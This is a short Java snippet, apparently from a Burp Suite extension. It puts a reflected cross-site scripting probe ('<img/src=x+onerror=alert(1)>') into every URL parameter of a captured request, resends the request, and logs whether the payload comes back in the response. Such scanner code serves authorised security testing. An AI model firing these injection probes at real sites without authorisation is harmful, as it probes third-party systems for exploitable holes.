List<HttpParameter> modifiedParams = new ArrayList<>();
requestResponse.request().parameters().forEach((param) -> {
    if (param.type() == HttpParameterType.URL) {
        logging.logToOutput(String.format("[+] injectiong XSS payload in parameter named: '%s'", param.name()));
        HttpParameter p = HttpParameter.urlParameter(param.name(), "<img/src=x+onerror=alert(1)>");
        modifiedParams.add(p);
    } else {
        modifiedParams.add(param);
    }
});

var response = api().http().sendRequest(requestResponse.request().withUpdatedParameters(modifiedParams)).response();
var body = response.body().toString();
if (body.contains("onerror=\"alert(")
	|| body.contains("onerror=alert(")) {
    logging.logToOutput("[+] the submitted XSS payload (<img/src=x onerror=alert(1)>) has been reflected in the response body!");
}
